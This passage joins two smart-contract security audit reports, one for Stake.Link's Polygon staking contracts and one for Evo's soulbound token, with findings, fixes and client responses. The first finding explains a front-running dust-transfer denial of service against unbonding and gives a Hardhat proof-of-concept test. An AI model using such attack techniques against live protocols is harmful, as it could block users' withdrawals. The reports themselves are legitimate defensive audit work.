A common, though infrequent, scenario occurs when iteration leaves `toUnbondRemaining` with a small amount for the next validator. This amount may be coverable by the validator's rewards, but if those rewards are below the threshold in the [ValidatorShares](https://etherscan.io/address/0x7e94d6cAbb20114b22a088d828772645f68CC67B#code#F1#L225) contract, the transaction will revert, causing a DoS in the `unbond` process.

**Example:**
1. Strategy has 3 validators.
2. Validator 3 has accumulated 0.9 tokens in rewards
3. The system needs to unbond 30.5 tokens in total
4. Validators 1 and 2 cover 30 tokens with their unbonds
5. Validator 3 is expected to cover the remaining 0.5 tokens with its 0.9 rewards(`withdrawRewards` is triggered)
6. The transaction reverts because 0.9 tokens is less than minAmount from ValidatorShares

The current logic also allows a malicious user to DoS the `unbond`  transaction due to the way rewards are calculated in the `unbound` function:

```solidity
uint256 deposits = vault.getTotalDeposits();
uint256 principalDeposits = vault.getPrincipalDeposits();
uint256 rewards = deposits - principalDeposits;
```
The `getTotalDeposits` accounts for the current token balance in the `PolygonVault` contract.  If the `toUnbondRemaining` and validator's rewards are less than vault's minimum rewards, an attacker can front-run the transaction and cause `unbond` to revert given the current scenario:

1. Attacker sent dust amount to the `PolygonVault`. Enough to cover `toUnbondRemaining` but < 1e18 (minimum rewards).
2. `rewards = deposits - principalDeposits` >= `toUnbondRemaining`.
3. Vault will call `withdrawRewards` but current claim amount to be withdrawn < `1e18`(trigger for the revert in [ValidatorShares](https://etherscan.io/address/0x7e94d6cAbb20114b22a088d828772645f68CC67B#code#F1#L225))
4. Transaction reverts.

**Impact:** DoS in the unbonding process when small rewards (< 1e18) are needed to complete withdrawals, blocking the protocol's withdrawal flow.

**Proof of Concept:**
1. First adjust the `PolygonValidatorShareMock` to reflect the same behavior as `ValidatorShares` by adding a minimum amount requirement when withdrawing rewards.
```diff
// PolygonValidatorShareMock
   function withdrawRewardsPOL() external {
        uint256 rewards = liquidRewards[msg.sender];
        if (rewards == 0) revert NoRewards();
+        require(rewards >= 1e18, "Too small rewards amount");

        delete liquidRewards[msg.sender];
        stakeManager.withdraw(msg.sender, rewards);
    }
```

2. Paste the following test in `polygon-fund-flow-controller.test.ts` and `run npx hardhat test test/polygonStaking/polygon-fund-flow-controller.test.ts`:
```solidity
describe.only('DoS', async () => {
    it('will revert when withdrawRewards < 1e18', async () => {
      const { token, strategy, vaults, fundFlowController, withdrawalPool, validatorShare, validatorShare2, validatorShare3 } =
      await loadFixture(deployFixture)
      console.log("will print some stuff")

      // validator funds: [10, 20, 30]
      await withdrawalPool.setTotalQueuedWithdrawals(toEther(970.5));
      assert.equal(await fundFlowController.shouldUnbondVaults(), true);

      // 1. Pre-condition: validator acumulated dust rewards since last unbonding.
      await validatorShare3.addReward(vaults[2].target, toEther(0.9));

      // expect that vault 2 has rewards
      assert.equal(await vaults[2].getRewards(), toEther(0.9));

      // 2. Unbond:
      // Validator A will cover 10 with unbond
      // Validator B will cover 20 with unbond
      // Validator C will cover the remaining 0.5 with his 0.9 rewards.
      await expect(fundFlowController.unbondVaults()).to.be.revertedWith("Too small rewards amount");
    })
  })
```
Output:
```javascript
PolygonFundFlowController
    DoS
       will revert when withdrawRewards < 1e18 (800ms)

  1 passing (800ms)
```

**Recommended Mitigation:** In the `PolygonStrategy.unbond` check if the **actual** rewards that can be withdrawn from the `ValidatorShares` is greater than the min amount for claim(1e18) before calling `withdrawRewards`.
```diff
-if (rewards >= toUnbondRemaining) {
-    vault.withdrawRewards();
-    toUnbondRemaining = 0;
+if (rewards >= toUnbondRemaining && vault.getRewards() >= vault.minAmount()) {
+    vault.withdrawRewards();
+    toUnbondRemaining = 0;
} else {
+    if (toUnbondRemaining > rewards) {
+        toUnbondRemaining -= rewards;
+    }
-    toUnbondRemaining -= rewards;
     uint256 vaultToUnbond = principalDeposits >= toUnbondRemaining
         ? toUnbondRemaining
         : principalDeposits;
```


**Stake.Link:** Resolved in [PR 151](https://github.com/stakedotlink/contracts/pull/151/commits/fec5777db57e3649b27f8cff7ab2fd34b3fb9857)

**Cyfrin:** Resolved.


### `disableInitializers` not used to prevent uninitialized contracts

**Description:** `PolygonVault` and `PolygonStrategy` contracts are designed to be upgradeable.

They are both inheriting from `Initializable` but do not have a constructor that calls `_disableInitializers()`.

An uninitialized contract can be taken over by an attacker. This applies to both a proxy and its implementation contract, which may impact the proxy. To prevent the implementation contract from being used, `_disableInitializers()` should be called in the constructor to automatically lock it when it is deployed.

**Impact:** Missing constructor with `_disableInitializers()` in `PolygonVault` and `PolygonStrategy` risks unauthorized takeover of uninitialized upgradeable contracts.

**Recommended Mitigation:** Consider adding a constructor to `PolygonVault` and `PolygonStrategy` that explicitly calls `_disableInitializers()`.

**Stake.Link:** Resolved in [PR 151](https://github.com/stakedotlink/contracts/pull/151/commits/7278d0babbf495fb593d1c1e9d827d3d26d94d53)

**Cyfrin:** Resolved.

\clearpage
## Informational


### Missing event emission for PolygonStrategy::setFundFlowController

**Description:** A crucial strategy parameter ie. the `fundFlowController` can be updated by the owner. However no event emission exists for such an update.

**Recommended Mitigation:** Consider emitting an event for the `setFundFlowController` function.

**Stake.Link:** Acknowledged. `fundFlowController` is only ever set once at time of contract deployment

**Cyfrin:** Acknowledged.


### Missing check for `validatorMEVRewardsPercentage` in `PolygonStrategy::initialize`

**Description:** `validatorMEVRewardsPercentage`is a reward percentage with valid values ranging from 0 to 10000 (100%). `PolygonStrategy::setValidatorMEVRewardsPercentage` rightly checks that the reward percentage does not exceed 10000. However this validation is missing during initialization.

```solidity
    function initialize(
        address _token,
        address _stakingPool,
        address _stakeManager,
        address _vaultImplementation,
        uint256 _validatorMEVRewardsPercentage,
        Fee[] memory _fees
    ) public initializer {
        __Strategy_init(_token, _stakingPool);

        stakeManager = _stakeManager;
        vaultImplementation = _vaultImplementation;
        validatorMEVRewardsPercentage = _validatorMEVRewardsPercentage; //@audit missing check on validatorMEVRewardsPercentage

```

**Recommended Mitigation:** Consider making the validation checks consistent at every place where the `validatorMEVRewardsPercentage` is updated.

**Stake.Link:** Resolved in [PR 151](https://github.com/stakedotlink/contracts/pull/151/commits/2ef53d4f0dac80c6ba1dc31ec516a28d7ed02851)

**Cyfrin:** Resolved.


### Missing zero address checks

**Description:** Critical address in the controller, strategy and vault contracts have missing zero address checks, both at the time of initialization and later, at the time of updates.

`PolygonStrategy.sol`
```solidity
    function setValidatorMEVRewardsPool(address _validatorMEVRewardsPool) external onlyOwner {
        validatorMEVRewardsPool = IRewardsPool(_validatorMEVRewardsPool); //@audit missing zero address check
    }

   function setVaultImplementation(address _vaultImplementation) external onlyOwner { //@audit missing zero address check
        vaultImplementation = _vaultImplementation;
        emit SetVaultImplementation(_vaultImplementation);
    }
```

`PolygonFundFlowController.sol`
```solidity
   function setDepositController(address _depositController) external onlyOwner {
        depositController = _depositController; // @audit missing zero address check
    }
```

**Recommended Mitigation:** Consider introducing zero address checks at all places highlighted above.

**Stake.Link:** Resolved in [PR 151](https://github.com/stakedotlink/contracts/pull/151/commits/9889b7b628050dbc791f028aeb8b9ff8b21cd93a)

**Cyfrin:** Resolved.



### Incorrect event emission when removing fees via the `PolygonStrategy::updateFee`

**Description:** Fee for a given index can be removed by passing `_feeBasisPoints = 0` for a given fee index.

Current logic is swapping the fee at the index with that of the last index in the `fees` array, and then popping the last element of the `fees` array.

However, the event emitted for this action suggests that the fee at the index is updated to 0. This is incorrect because the fee at the index is the fee corresponding to the last index of the original `fees` array. Additionally, in this scenario, the `UpdateFee` event is emitting the `receiver` passed as an input to the function without verifying if this receiver indeed matches the receiver for the removed fee index.

```solidity
function updateFee(
        uint256 _index,
        address _receiver,
        uint256 _feeBasisPoints
    ) external onlyOwner {

        if (_feeBasisPoints == 0) {
            fees[_index] = fees[fees.length - 1];
            fees.pop();

        } else {
              // ... code
        }
        emit UpdateFee(_index, _receiver, _feeBasisPoints); //@audit if _feeBasisPoints == 0, the fee for the index is now the fee in the last index (for old array)
    }
```

**Recommended Mitigation:** Consider adding an event `RemoveFee` similar to `AddFee` for the special case when `_feeBasisPoints == 0`. This will clearly separate the scenario where fee at an index is just updated v/s removed altogether.


**Stake.Link:** Resolved in [PR 151](https://github.com/stakedotlink/contracts/pull/151/commits/bd29a3eee47f41ad9418418d7c959e7372b1f755)

**Cyfrin:** Resolved.


### Missing check for `_feeBasisPoints > 0` in `PolygonStrategy::addFee`

**Description:** `PolygonStrategy::addFee` does not check if `_feeBasisPoints > 0` when adding a new fee element to the `fees` array. This is inconsistent with the `PolygonStrategy::updateFee` logic where `_feeBasisPoints = 0` triggers a removal of the fee element from the `fees` array.

**Recommended Mitigation:** Consider introducing a non-zero check to `_feeBasisPoints`.

**Stake.Link:** Acknowledged. Owner will ensure the correct value is set.

**Cyfrin:** Acknowledged.


### No slippage protection when interacting with `ValidatorShares`

**Description:** In the `PolygonVault.sol` contract, the `buyVoucherPOL` and `sellVoucherPOL` functions do not set a slippage limit.

```solidity
// PolygonVault
    function deposit(uint256 _amount) external onlyVaultController {
        token.safeTransferFrom(msg.sender, address(this), _amount);

        // @audit-issue - no slippage limit.
@>        validatorPool.buyVoucherPOL(_amount, 0);

        uint256 balance = token.balanceOf(address(this));
        if (balance != 0) token.safeTransfer(msg.sender, balance);
    }

   function unbond(uint256 _amount) external onlyVaultController {
         // @audit-issue no slippage limit
@>         validatorPool.sellVoucherPOL(_amount, type(uint256).max);

        uint256 balance = token.balanceOf(address(this));
        if (balance != 0) token.safeTransfer(msg.sender, balance);
    }
```

Currently, there is no active slashing in `ValidatorShares`, therefore loss of funds cannot occur.

**Recommended Mitigation:** Keep monitoring Polygon PoS governance for slashing updates; if implemented, upgrade the contract to support slashing accordingly.


**[Project]:**
Acknowledged. Will implement slippage protection if slashing is introduced.

**Cyfrin:** Acknowledged.


### Missing input validation in `PolygonFundFlowController.setMinTimeBetweenUnbonding`

**Description:** The `setMinTimeBetweenUnbonding` function from `PolygonFundFlowController` lacks input validation for the `_minTimeBetweenUnbonding` parameter, allowing it to be set to any value including zero or extremely high values.
```solidity
    function setMinTimeBetweenUnbonding(uint64 _minTimeBetweenUnbonding) external onlyOwner {
        minTimeBetweenUnbonding = _minTimeBetweenUnbonding;  // @audit missing input validation
        emit SetMinTimeBetweenUnbonding(_minTimeBetweenUnbonding);
    }
```

**Recommended Mitigation:** Add a min/max value check before setting the `minTimeBetweenUnbonding`. I.e:
```diff
// declare MIN_VALUE and MAX_VALUE with the proper values.
function setMinTimeBetweenUnbonding(uint64 _minTimeBetweenUnbonding) external onlyOwner {
+    require(_minTimeBetweenUnbonding >= MIN_VALUE, "Time between unbonding too low");
+    require(_minTimeBetweenUnbonding <= MAX_VALUE, "Time between unbonding too high");

    minTimeBetweenUnbonding = _minTimeBetweenUnbonding;
    emit SetMinTimeBetweenUnbonding(_minTimeBetweenUnbonding);
}
```

**Stake.Link:** Acknowledged. Owner will ensure correct value is set.

**Cyfrin:** Acknowledged.


### Potential infinite loop in `PolygonStrategy::unbond` due to insufficient balance check

**Description:** `PolygonStrategy::unbond` function contains a while loop that continues until the entire requested unbonding amount (`toUnbondRemaining`) is processed. However, there is no safeguard to handle a scenario where the total available balance across all vaults is insufficient to satisfy the unbonding request.

```solidity
function unbond(uint256 _toUnbond) external onlyFundFlowController {
    // ...
    uint256 toUnbondRemaining = _toUnbond;

    // ...
    while (toUnbondRemaining != 0) {
        // Process vaults...
        ++i;
        if (i >= vaults.length) i = 0;
        // No check for complete loop iteration without progress
    }
    // ...
}
```
The issue arises because the function assumes that the unbonding amount will always be covered by the total staked amount across all vaults. While this assumption might hold in the current single-strategy setup, it is not guaranteed, especially in a multi-strategy environment.

It is noteworthy that the withdrawal pool, which keeps track of `queuedWithdrawals` that determine the magnitude of `unbonding`, operates at a global level across all strategies.

**Impact:** Although an unlikely scenario for the current single strategy setup, an infinite while loop consumes all available gas.

**Recommended Mitigation:** Consider adding a safety mechanism to detect when the loop has iterated through all vaults without making progress, indicating insufficient funds to satisfy the unbonding request.

```diff solidity

function unbond(uint256 _toUnbond) external onlyFundFlowController {

        while (toUnbondRemaining != 0) {
             // ... code
             if (i >= vaults.length) i = 0;

++       // Add safety check to prevent infinite loop
++        if (i == startingIndex) {
++            // We've gone through all vaults and still have amount to unbond
++            // Process partial unbonding with what we've got so far OR revert
++           break; // or revert if that's more appropriate
++        }

       }
}

```
**Stake.Link:** Resolved in [PR 151](https://github.com/stakedotlink/contracts/pull/151/commits/e138c991bc1f41ec1f33ea62b3459870a29c333e)

**Cyfrin:** Resolved.

\clearpage
## Gas Optimization


### Validate total fees in `PolygonStrategy::updateFee` only if the `_feeBasisPoints > 0`

**Description:** While updating the fee in `PolygonStrategy::updateFee`, if `_feeBasisPoints == 0`, the fee at the index is replaced with the fee at the last index of the array, and the last element is popped from the array.

Since fees is a non-negative value, there is no need to perform the total fee check in this scenario. It is worth highlighting that the check is gas heavy as it involves looping over a fee array.

```solidity
if (_totalFeesBasisPoints() > 3000) revert FeesTooLarge();
```

**Recommended Mitigation:** Consider moving the check into the `else` block.

**Stake.Link:** Resolved in [PR 151](https://github.com/stakedotlink/contracts/pull/151/commits/44a8f032e5ae9697440f3b7d83a10538ab88e877)

**Cyfrin:** Resolved.


### Inefficient rewards collection pattern in the `PolygonStrategy::unbond()` function leads to unnecessary gas consumption

**Description:** The current implementation of the `PolygonStrategy::unbond()` function processes vaults sequentially and makes immediate unbonding decisions on a per-vault basis.

This approach can lead to unnecessary unbonding operations when the total rewards across all vaults would be sufficient to cover the withdrawal amount.

In the current implementation:

1. The function iterates through each vault
2. For each vault, it extracts rewards if available
3. If rewards from a single vault are insufficient, it immediately unbonds principal from that vault
4. It continues this process until the full `_toUnbond` amount is satisfied

This implementation doesn't consider the total available rewards across all vaults before making unbonding decisions, resulting in potential unnecessary unbonding operations that consume significant gas.

**Impact:**
- Higher gas costs: Each unnecessary unbonding operation consumes additional gas, especially since it later requires a separate unstakeClaim call to finalize the withdrawal

- Capital inefficiency: Unbonding principal when rewards would have been sufficient reduces the amount of capital earning yields in the protocol

- Longer waiting periods: Unlike rewards, unbonded principal is subject to waiting periods before it can be re-used or withdrawn

**Recommended Mitigation:** Refactor the unbond() function to use a two-phase approach:
1. Collect all rewards until the cumulative rewards are enough to honor unbonding request
2. Start vault unbonding only after all rewards are collected.

Here is a sample implementation:

```solidity
function unbond(uint256 _toUnbond) external onlyFundFlowController {
    if (numVaultsUnbonding != 0) revert UnbondingInProgress();
    if (_toUnbond == 0) revert InvalidAmount();

    uint256 toUnbondRemaining = _toUnbond;
    uint256 preBalance = token.balanceOf(address(this));
    uint256 skipIndex = validatorRemoval.isActive ? validatorRemoval.validatorId : type(uint256).max;
    uint256 numVaultsUnbonded;

    // @audit Phase 1 -> Withdraw all rewards first
    for (uint256 i = 0; i < vaults.length; i++) {
        if (i != skipIndex) {
            IPolygonVault vault = vaults[i];
            uint256 rewards = vault.getRewards();

            if (rewards > 0) {
                vault.withdrawRewards();

                // @audit Check if we've collected enough rewards
                uint256 currentBalance = token.balanceOf(address(this));
                uint256 collectedRewards = currentBalance - preBalance;
                if (collectedRewards >= toUnbondRemaining) {
                    // @audit We've collected enough rewards, no need to unbond principal
                    totalQueued += collectedRewards;
                    emit Unbond(_toUnbond);
                    return;
                }
            }
        }
    }

    // @audit Phase 2: If rewards weren't enough, unbond principal
    uint256 rewardsCollected = token.balanceOf(address(this)) - preBalance;
    toUnbondRemaining -= rewardsCollected;

    uint256 i = validatorWithdrawalIndex;
    while (toUnbondRemaining != 0) {
        if (i != skipIndex) {
            IPolygonVault vault = vaults[i];
            uint256 principalDeposits = vault.getPrincipalDeposits();

            if (principalDeposits != 0) {
                uint256 vaultToUnbond = principalDeposits >= toUnbondRemaining
                    ? toUnbondRemaining
                    : principalDeposits;

                vault.unbond(vaultToUnbond);
                toUnbondRemaining -= vaultToUnbond;
                ++numVaultsUnbonded;
            }
        }

        ++i;
        if (i >= vaults.length) i = 0;
    }

    validatorWithdrawalIndex = i;
    numVaultsUnbonding = numVaultsUnbonded;
    totalQueued += token.balanceOf(address(this)) - preBalance;

    emit Unbond(_toUnbond);
}
```

**Stake.Link:** Acknowledged.

**Cyfrin:** Acknowledged.

\clearpage

------ FILE END car/reports_md/2025-05-19-cyfrin-stakedotlink-polygon-staking-v2.0.md ------


------ FILE START car/reports_md/2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md ------

**Lead Auditors**

[Dacian](https://x.com/DevDacian)

[Giovanni Di Siena](https://x.com/giovannidisiena)
**Assisting Auditors**

 


---

# Findings
## Low Risk


### Missing common Chainlink Oracle validations

**Description:** The protocol is missing common [Chainlink Oracle validations](https://medium.com/contractlevel/chainlink-oracle-defi-attacks-93b6cb6541bf); it calls `AggregatorV3Interface::latestRoundData` without any validation of the result:
```solidity
function _getLatestPrice() internal view returns (uint256) {
    //slither-disable-next-line unused-return
    (, int256 price,,,) = i_nativeUsdFeed.latestRoundData();
    return uint256(price);
}
```

**Recommended Mitigation:** Implement common Chainlink oracle validations such as checking for:
* [stale prices](https://medium.com/contractlevel/chainlink-oracle-defi-attacks-93b6cb6541bf#99af) using the [correct heartbeat](https://medium.com/contractlevel/chainlink-oracle-defi-attacks-93b6cb6541bf#fb78) for the particular oracle
* [down L2 sequencer](https://medium.com/contractlevel/chainlink-oracle-defi-attacks-93b6cb6541bf#0faf), [revert if `startedAt == 0`](https://solodit.contractlevel.io/issues/insufficient-checks-to-confirm-the-correct-status-of-the-sequenceruptimefeed-codehawks-zaros-git) and potentially a small [grace period](https://docs.chain.link/data-feeds/l2-sequencer-feeds#example-code) of ~2 minutes after it recovers before resuming to fetch price data
* [returned price not at min or max boundaries](https://medium.com/contractlevel/chainlink-oracle-defi-attacks-93b6cb6541bf#00ac)

For this protocol the impact of omitting these checks is quite minimal; in a worst-case scenario users are able to buy NFTs for a cheaper or greater price, but there is no threat to protocol solvency/user liquidation etc as can be a threat in other protocols. And since users can only buy 1 NFT and can't sell/transfer, it isn't that big a deal. If these checks are excluded to keep gas costs down perhaps just put a comment noting this.

**Evo:**
Fixed in commits [6af531e](https://github.com/contractlevel/sbt/commit/6af531e49f7d7dd525da449bcdbdacb171e0c70d),[7a06688](https://github.com/contractlevel/sbt/commit/7a0668860f9b4f43798988349a966147bf94f33f), [93021e4](https://github.com/contractlevel/sbt/commit/93021e4f9c2afb40f64f9f9de69661a134702313).

**Cyfrin:** Verified.


### Users who are removed from the blacklist have to pay again for their NFT

**Description:** When a user is added to the blacklist, the NFT which they already paid for is burned:
```solidity
function _addToBlacklist(address account) internal {
    // *snip: code not relevant *//

    if (balanceOf(account) > 0) {
        uint256 tokenId = tokenOfOwnerByIndex(account, 0); // Get first token
        _burn(tokenId); // Burn the token
    }
}
```

But when they are removed from the blacklist, they do not receive a free NFT to make up for their previously burned one, nor is there any flag set that would enable them to mind their NFT again but without paying a fee:
```solidity
function _removeFromBlacklist(address account) internal {
    if (!s_blacklist[account]) revert SoulBoundToken__NotBlacklisted(account);

    s_blacklist[account] = false;
    emit RemovedFromBlacklist(account);
}
```

**Impact:** A user who bought an NFT, then was blacklisted, then removed from the blacklist will have to pay twice to get the NFT.

**Recommended Mitigation:** This doesn't seem fair; if a user had an NFT burned when they were blacklisted, they should receive a free NFT back if later removed from the blacklist.

**Evo:**
Acknowledged; in the unlikely case a user is blacklisted due to admin error then subsequently removed from the blacklist, the DAO will compensate the user via a community vote.


### Round up fee against users

**Description:** Solidity by default rounds down, but generally fees should be rounded up against users. Using Solady's [library](https://github.com/Vectorized/solady/blob/main/src/utils/FixedPointMathLib.sol) is significantly more efficient than OpenZeppelin:
```solidity
import {FixedPointMathLib} from "@solady/utils/FixedPointMathLib.sol";

function _getFee() internal view returns (uint256 fee) {
    // read fee factor directly to output variable
    fee = s_feeFactor;

    // only do extra work if non-zero
    if(fee != 0) fee = FixedPointMathLib.fullMulDivUp(fee, PRICE_FEED_PRECISION, _getLatestPrice());
}
```

A secondary benefit of using the above is eliminating the possibility of revert due to [intermediate multiplication overflow](https://x.com/DevDacian/status/1892529633104396479), though in this code it isn't a real possibility.

If you don't want to round up against users but want a slightly faster implementation than the default:
```solidity
function _getFee() internal view returns (uint256 fee) {
    // read fee factor directly to output variable
    fee = s_feeFactor;

    // only do extra work if non-zero
    if(fee != 0) fee = (fee * PRICE_FEED_PRECISION) / _getLatestPrice();
}
```

**Evo:**
Fixed in commit [52c5384](https://github.com/contractlevel/sbt/commit/52c538448fbceb09f27ae657bcecb0c1483eb933).

**Cyfrin:** Verified.


### Whale can buy near-infinite voting power via `mintWithTerms`

**Description:** Since whales can control near-infinite addresses, as long as they have the funds they can buy near-infinite voting power via `mintWithTerms`.

**Impact:** This could be used seconds before a proposal is due to expire to decide that proposal. Long-term impact is limited however since the admins can blacklist addresses which burn the NFTs.

**Recommended Mitigation:** Implement a snapshot mechanism to capture total and individual user voting power prior to proposals. Consider implementing pausing to prevent users from minting NFTs via `mintWithTerms` since this is the only function which allows "unlimited mints".

**Evo:**
Fixed in commit [2fbd2c5](https://github.com/contractlevel/sbt/commit/2fbd2c5379a5f07a8166ec4041f392d867f5bedd) by allowing admins to pause `mintWithTerms`.

**Cyfrin:** Verified.


### `_verifySignature` is not compatible with smart contract wallets or other smart accounts

**Description:** Support for smart accounts (e.g. [ERC-4337](https://eips.ethereum.org/EIPS/eip-4337)) and other smart contract wallets (e.g. Safe{Wallet}) minting tokens is not currently possible as the signature verification implemented in `_verifySignature` is only able to handle those generated by EOAs. Here, it could be beneficial to support signature verification not just for smart accounts but also other smart contracts that could include multi-sig wallets or any other use case, for example DAOs with their own smart contract infrastructure, to allow other organizations to participate as members.

EOAs upgraded to [ERC-7702](https://eips.ethereum.org/EIPS/eip-7702) accounts are unaffected, but any other smart contract signatures cannot be verified without implementing [ERC-1271](https://eips.ethereum.org/EIPS/eip-1271). However, this adds the additional consideration that for EIP-7702 accounts the code length will be non-zero, so while these accounts can have their signatures verified using EIP-1271, the private key still holds full authority to sign transactions which means that any implementation of a code length check such as in the [OpenZeppelin SignatureChecker library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/SignatureChecker.sol) will need to be slightly modified to continue to allow verification of signatures from these accounts generated using `eth/personal_sign`. Additional discussion can be found [here](https://blog.rhinestone.wtf/unlocking-chain-abstracted-eoas-with-eip-7702-and-irrevocable-signatures-adc820a150ef).

To support such smart contract signatures, consider falling back to the OpenZeppelin SignatureChecker library function `isValidERC1271SignatureNow` like so:

```diff
    function _verifySignature(bytes memory signature) internal view returns (bool) {
        /// @dev compute the message hash: keccak256(termsHash, msg.sender)
        bytes32 messageHash = keccak256(abi.encodePacked(s_termsHash, msg.sender));

        /// @dev apply Ethereum signed message prefix
        bytes32 ethSignedMessageHash = MessageHashUtils.toEthSignedMessageHash(messageHash);

        /// @dev attempt to recover the signer
        //slither-disable-next-line unused-return
        (address recovered, ECDSA.RecoverError error,) = ECDSA.tryRecover(ethSignedMessageHash, signature);

        /// @dev return false if errors or incorrect signer
++      if (error == ECDSA.RecoverError.NoError && recovered == msg.sender) return true;
++      else return SignatureChecker.isValidERC1271SignatureNow(msg.sender, ethSignedMessageHash, signature);
    }
```

**Evo:**
Fixed in commit [6d4f41c](https://github.com/contractlevel/sbt/commit/6d4f41ce160e19713bb4a6cafdf1b739df98e027#diff-39790f8feee6ea105eee119137d7c3d881007ed50d9a62590b54ff559f45b27aL511-R514).

**Cyfrin:** Verified.

\clearpage
## Informational


### Prefer`Ownable2Step` instead of `Ownable`

**Description:** Prefer [Ownable2Step](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol) instead of `Ownable` for [safer ownership transfer](https://www.rareskills.io/post/openzeppelin-ownable2step).

**Evo:**
Fixed in commit [620120e](https://github.com/contractlevel/sbt/commit/620120ec5a85c3a2dbd1be52af4ee34fe946efbe).

**Cyfrin:** Verified.


### Assuming Chainlink price feed decimals can lead to unintended errors

**Description:** In general, Chainlink x/USD price feeds use 8 decimal precision however this is not universally true for example [AMPL/USD](https://etherscan.io/address/0xe20CA8D7546932360e37E9D72c1a47334af57706#readContract#F3) uses 18 decimal precision.

Instead of [assuming Chainlink oracle price precision](https://medium.com/contractlevel/chainlink-oracle-defi-attacks-93b6cb6541bf#87fc), the precision variable could be declared `immutable` and initialized in the constructor via [`AggregatorV3Interface::decimals`](https://docs.chain.link/data-feeds/api-reference#decimals).

In practice though the price oracle is hard-coded in `script/HelperConfig.s.sol` and does use 8 decimals for on Optimism, so the current configuration will work fine.

**Evo:**
Fixed in commit [f594ae0](https://github.com/contractlevel/sbt/commit/f594ae004d4afc80f19e17c0f61d50caa00a4811).

**Cyfrin:** Verified.


### Don't initialize to default values

**Description:** Don't initialize to default values as Solidity already does this:
```solidity
SoulBoundToken.sol
125:        for (uint256 i = 0; i < admins.length; ++i) {
162:        for (uint256 i = 0; i < accounts.length; ++i) {
226:        for (uint256 i = 0; i < accounts.length; ++i) {
245:        for (uint256 i = 0; i < accounts.length; ++i) {
270:        for (uint256 i = 0; i < accounts.length; ++i) {
289:        for (uint256 i = 0; i < accounts.length; ++i) {
312:        for (uint256 i = 0; i < accounts.length; ++i) {
```

**Evo:**
Fixed in commit [f594ae0](https://github.com/contractlevel/sbt/commit/f594ae004d4afc80f19e17c0f61d50caa00a4811).

**Cyfrin:** Verified.


### Remove obsolete `return` statements when already using named returns

**Description:** Remove obsolete `return` statements when already using named returns:
```diff
    function _mintSoulBoundToken(address account) internal returns (uint256 tokenId) {
        tokenId = _incrementTokenIdCounter(1);
        _safeMint(account, tokenId);
-       return tokenId;
    }

    function _incrementTokenIdCounter(uint256 count) internal returns (uint256 startId) {
        startId = s_tokenIdCounter;
        s_tokenIdCounter += count;
-       return startId;
    }
```

**Evo:**
Fixed in commit [f594ae0](https://github.com/contractlevel/sbt/commit/f594ae004d4afc80f19e17c0f61d50caa00a4811).

**Cyfrin:** Verified.


### Consider preventing users from over-paying

**Description:** Currently the protocol allows users to over-pay:
```solidity
function _revertIfInsufficientFee() internal view {
    if (msg.value < _getFee()) revert SoulBoundToken__InsufficientFee();
}
```

Consider changing this to require the exact fee to prevent users from accidentally over-paying:
```solidity
function _revertIfIncorrectFee() internal view {
    if (msg.value != _getFee()) revert SoulBoundToken__IncorrectFee();
}
```

[Fat Finger](https://en.wikipedia.org/wiki/Fat-finger_error) errors have previously resulted in notorious unintended errors in financial markets; the protocol could choose to be defensive and help protect users from themselves.

**Evo:**
Fixed in commit [e3b2f74](https://github.com/contractlevel/sbt/commit/e3b2f74239601b2721118e11aaa92b42dbb502e9).

**Cyfrin:** Verified.


### `else` can be omitted in `mintWithTerms`

**Description:** `else` can be omitted in `mintWithTerms` since if signature validation failed a revert will occur:
```diff
        if (!_verifySignature(signature)) revert SoulBoundToken__InvalidSignature();
-       else emit SignatureVerified(msg.sender, signature);
+       emit SignatureVerified(msg.sender, signature);
        tokenId = _mintSoulBoundToken(msg.sender);
```

**Evo:**
Fixed in commit [e3b2f74](https://github.com/contractlevel/sbt/commit/e3b2f74239601b2721118e11aaa92b42dbb502e9).

**Cyfrin:** Verified.

\clearpage
## Gas Optimization


### Use named returns where this can eliminate local function variables and for `memory` returns

**Description:** Using named returns is more gas efficient where this can eliminate local function variables and for `memory` returns:
```diff
-   function batchMintAsAdmin(address[] calldata accounts) external onlyAdmin returns (uint256[] memory) {
+   function batchMintAsAdmin(address[] calldata accounts) external onlyAdmin returns (uint256[] memory tokenIds) {
        _revertIfEmptyArray(accounts);
        uint256 startId = _incrementTokenIdCounter(accounts.length);

-      uint256[] memory tokenIds = new uint256[](accounts.length);
+      tokenIds = new uint256[](accounts.length);
        for (uint256 i = 0; i < accounts.length; ++i) {
            _mintAsAdminChecks(accounts[i]);
            tokenIds[i] = startId + i;
            _safeMint(accounts[i], tokenIds[i]);
        }
-      return tokenIds;
    }
```

Gas Result:
```diff
{
-  "batchMintAsAdmin": "252114"
+  "batchMintAsAdmin": "252102"
}
```

**Evo:**
Fixed in commit [b4fcadb](https://github.com/contractlevel/sbt/commit/b4fcadbd9c5684cc4e3b1ee3c39f72c406aaf658).

**Cyfrin:** Verified.


### Enable the optimizer

**Description:** [Enable the optimizer](https://dacian.me/the-yieldoor-gas-optimizoor#heading-enabling-the-optimizer) in `foundry.toml`.

Gas results:
```diff
{
-  "addToBlacklist": "31090"
+  "addToBlacklist": "30691"

-  "addToWhitelist": "28754"
+  "addToWhitelist": "28392"

-  "batchAddToBlacklist": "60282"
+  "batchAddToBlacklist": "59482"

-  "batchAddToWhitelist": "55790"
+  "batchAddToWhitelist": "54997"

-  "batchMintAsAdmin": "252102"
+  "batchMintAsAdmin": "248867"

-  "batchRemoveFromBlacklist": "5289"
+  "batchRemoveFromBlacklist": "4594"

-  "batchRemoveFromWhitelist": "5305"
+  "batchRemoveFromWhitelist": "4677"

-  "batchSetAdmin": "28090"
+  "batchSetAdmin": "27412"

-  "mintAsAdmin": "130754"
+  "mintAsAdmin": "129447"

-  "mintAsWhitelisted": "135623"
+  "mintAsWhitelisted": "132292"

-  "mintWithTerms": "142281"
+  "mintWithTerms": "137638"

-  "removeFromBlacklist": "2516"
+  "removeFromBlacklist": "2203"

-  "removeFromWhitelist": "2634"
+  "removeFromWhitelist": "2254"

-  "setAdmin": "27187"
+  "setAdmin": "26677"

-  "setContractURI": "29118"
+  "setContractURI": "26842"

-  "setFeeFactor": "26075"
+  "setFeeFactor": "25666"

-  "setWhitelistEnabled": "7175"
+  "setWhitelistEnabled": "6902"

-  "withdrawFees": "14114"
+  "withdrawFees": "13462"
}

```

**Evo:**
Fixed in commit [b4fcadb](https://github.com/contractlevel/sbt/commit/b4fcadbd9c5684cc4e3b1ee3c39f72c406aaf658).

**Cyfrin:** Verified.


